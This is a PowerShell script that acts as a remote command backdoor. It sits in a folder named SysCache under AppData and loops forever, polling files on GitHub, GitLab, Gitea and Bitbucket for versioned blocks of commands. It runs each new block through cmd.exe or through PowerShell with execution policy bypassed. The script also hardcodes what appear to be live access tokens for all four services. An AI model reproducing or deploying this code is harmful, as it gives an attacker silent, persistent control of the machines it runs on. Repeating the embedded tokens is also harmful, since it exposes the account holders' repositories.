# Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

############################
# CONFIG
############################
$INTERVAL      = 5
$CMD_TIMEOUT   = 60
$CURL_TIMEOUT  = 15
$BASE_DIR = "$env:USERPROFILE\AppData\Local\SysCache"

$STATE_DIR = Join-Path $BASE_DIR "state"
$LOG_DIR   = Join-Path $BASE_DIR "logs"
$CONFIG_ABC = Join-Path $BASE_DIR ".uniq_name"

New-Item -ItemType Directory -Force -Path $STATE_DIR, $LOG_DIR | Out-Null
Set-Location $BASE_DIR

$FILE = ""
$maxRetry = 2
$retry = 0

while ($retry -le $maxRetry) {
    if (Test-Path $CONFIG_ABC) {
        $FILE = (Get-Content $CONFIG_ABC -First 1).Trim()
        if (-not [string]::IsNullOrWhiteSpace($FILE)) {
            break
        }
    }

    if ($retry -lt $maxRetry) {
        Start-Sleep -Seconds 5
    }
    $retry++
}

if ([string]::IsNullOrWhiteSpace($FILE)) {
    $FILE = "test.txt"
}

Write-Host "Using file: $FILE"


New-Item -ItemType Directory -Force -Path $STATE_DIR, $LOG_DIR | Out-Null

############################
# TOKENS (READ ONLY)
############################
$GITHUB_TOKEN="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"
$GITHUB_OWNER="mahesh97m"
$GITHUB_REPO="phpcode"

$GITLAB_TOKEN="glpat-DClozHjP9aOyT4xotnJs8286MQp1OmpleGs4Cw.01.120o1vpv7"
$GITLAB_PROJECT_ID="77391265"
$BRANCH="main"

$GITEA_TOKEN="ad7ecc45d4f3f1421f62649d755df8b61a3f3c22"
$GITEA_OWNER="mahesh2210m"
$GITEA_REPO="mahesh2210m"

$BITBUCKET_TOKEN="ATCTT3xFfGN0OfF9SvlcZ2obggrqfCavTxQPw74JL2N1eWO6IeblaWQJ51Dy21DniuZWhwRmk4x_sKaVg11x3Sx_BMR7dpyZbYcknW7I3d1Gvhn2QXOd12z54PXDAg6RQ04GTEOeK_sQ_MoKxdrccqwpWy4cWsYhEtreA7Vpcgja4ISA6d77QL4=262DE832"
$BITBUCKET_WORKSPACE="mahesh2210m"
$BITBUCKET_REPO="mahesh"
############################
# TIME / LOGGING
############################
function TS { Get-Date -Format "yyyy-MM-dd HH:mm:ss" }

function Log-Exec($msg) {
    "$(TS) | $msg" | Add-Content "$LOG_DIR\executions.log"
}

function Log-Err($msg) {
    "$(TS) | $msg" | Add-Content "$LOG_DIR\errors.log"
}

############################
# SAFE COMMAND EXECUTION
############################
function Run-Cmd {
    param([string]$Cmd)

    try {
        $job = Start-Job -ScriptBlock {
            param($c)

            $isPS = $false
            if (
                $c -match '\|' -or
                $c -match 'Out-File|Write-Output|Start-Process|Get-|Set-|New-|Remove-|\$'
            ) {
                $isPS = $true
            }

            if ($isPS) {
                powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $c
                exit $LASTEXITCODE
            } else {
                cmd.exe /c $c
                exit $LASTEXITCODE
            }
        } -ArgumentList $Cmd

        if (Wait-Job $job -Timeout $CMD_TIMEOUT) {
            Receive-Job $job -ErrorAction SilentlyContinue | Out-Null
            $state = $job.State
            Remove-Job $job -Force

            return ($state -eq "Completed")
        }
        else {
            Stop-Job $job -Force
            Remove-Job $job -Force
            return $false
        }

    } catch {
        return $false
    }
}


############################
# SAFE CURL (Invoke-WebRequest)
############################
function Safe-Fetch {
    param(
        [string]$Url,
        [hashtable]$Headers
    )

    try {
        $resp = Invoke-WebRequest `
            -Uri $Url `
            -Headers $Headers `
            -TimeoutSec $CURL_TIMEOUT `
            -UseBasicParsing
        return $resp.Content
    } catch {
        return $null
    }
}

############################
# FETCHERS
############################
function Fetch-GitHub {
    Safe-Fetch `
      "https://api.github.com/repos/$GITHUB_OWNER/$GITHUB_REPO/contents/$FILE" `
      @{ Authorization="token $GITHUB_TOKEN"; Accept="application/vnd.github.v3.raw" }
}

function Fetch-GitLab {
    Safe-Fetch `
      "https://gitlab.com/api/v4/projects/$GITLAB_PROJECT_ID/repository/files/$FILE/raw?ref=$BRANCH" `
      @{ "PRIVATE-TOKEN"=$GITLAB_TOKEN }
}

function Fetch-Gitea {
    Safe-Fetch `
      "https://gitea.com/api/v1/repos/$GITEA_OWNER/$GITEA_REPO/raw/$BRANCH/$FILE" `
      @{ Authorization="token $GITEA_TOKEN" }
}

function Fetch-Bitbucket {
    Safe-Fetch `
      "https://api.bitbucket.org/2.0/repositories/$BITBUCKET_WORKSPACE/$BITBUCKET_REPO/src/$BRANCH/$FILE" `
      @{ Authorization="Bearer $BITBUCKET_TOKEN" }
}

############################
# VERSION COMPARE
############################
function Version-Greater {
    param($A, $B)
    return ([Version]$A -gt [Version]$B)
}

############################
# MAIN LOOP (NEVER BLOCKS)
############################
while ($true) {

    foreach ($SRC in "github","gitlab","gitea","bitbucket") {

        switch ($SRC) {
            "github"   { $CONTENT = Fetch-GitHub }
            "gitlab"   { $CONTENT = Fetch-GitLab }
            "gitea"    { $CONTENT = Fetch-Gitea }
            "bitbucket"{ $CONTENT = Fetch-Bitbucket }
        }

        if ([string]::IsNullOrWhiteSpace($CONTENT)) { continue }

        $LAST_FILE = "$STATE_DIR\${SRC}_last_version.txt"
        if (!(Test-Path $LAST_FILE)) { "" | Set-Content $LAST_FILE }

        $LAST_VERSION = (Get-Content $LAST_FILE).Trim()

        $CURRENT_VERSION = ($CONTENT -split "`n" |
            Where-Object { $_ -match '^[0-9]+(\.[0-9]+)*$' } |
            Select-Object -Last 1).Trim()

        if ([string]::IsNullOrWhiteSpace($CURRENT_VERSION)) { continue }

        if ($LAST_VERSION -eq "" -or (Version-Greater $CURRENT_VERSION $LAST_VERSION)) {

            Log-Exec "SRC=$SRC NEW_VERSION=$CURRENT_VERSION"

            $lines = $CONTENT -split "`n"
            $run = $false

            foreach ($line in $lines) {
                $cmd = $line.Trim()

                if ($cmd -eq $CURRENT_VERSION) { $run = $true; continue }
                if ($run -and $cmd -match '^[0-9]+(\.[0-9]+)*$') { break }
                if ($run -and $cmd.Length -gt 0) {

                    Log-Exec "SRC=$SRC RUN: $cmd"

                    if (Run-Cmd $cmd) {
                        Log-Exec "SRC=$SRC SUCCESS"
                    } else {
                        Log-Err "SRC=$SRC FAILED or TIMEOUT: $cmd"
                    }
                }
            }

            $CURRENT_VERSION | Set-Content $LAST_FILE
            Log-Exec "SRC=$SRC VERSION UPDATED"
        }
    }

    Start-Sleep -Seconds $INTERVAL
}
